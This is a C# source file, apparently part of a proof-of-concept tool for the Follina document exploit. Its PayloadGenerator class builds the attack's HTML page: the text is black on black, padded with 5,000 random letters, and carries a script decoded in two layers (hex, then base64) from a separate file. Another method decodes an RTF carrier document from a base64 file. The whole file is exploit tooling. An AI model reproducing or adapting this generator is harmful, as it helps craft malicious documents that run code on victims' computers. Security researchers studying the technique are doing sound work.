using System;
using System.IO;
using System.IO.Compression;
using System.Text;

namespace Follina_PoC
{
    internal static class PayloadGenerator
    {
        private static readonly Random random = new();

        public static byte[] CreateHTMLPayload()
        {
            string text = "<!doctype html><html lang =\"pl\"><body style=\"background-color: black; color: black;\">";

            for (int i = 0; i < 5000; i++)
            {
                text += Convert.ToChar(random.Next(65, 91));
            }

            text += Environment.NewLine;

            var script = File.ReadAllText(@".\Files\JavaScript.txt");

            text += Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromHexString(script))));

            text += "</body></html>";
       
            return Encoding.UTF8.GetBytes(text);
        }

        public static string CreateRTF()
        {
            var text = File.ReadAllText(@".\Files\RTF.txt");

            return Encoding.UTF8.GetString(Convert.FromBase64String(text));
        }
    }
}
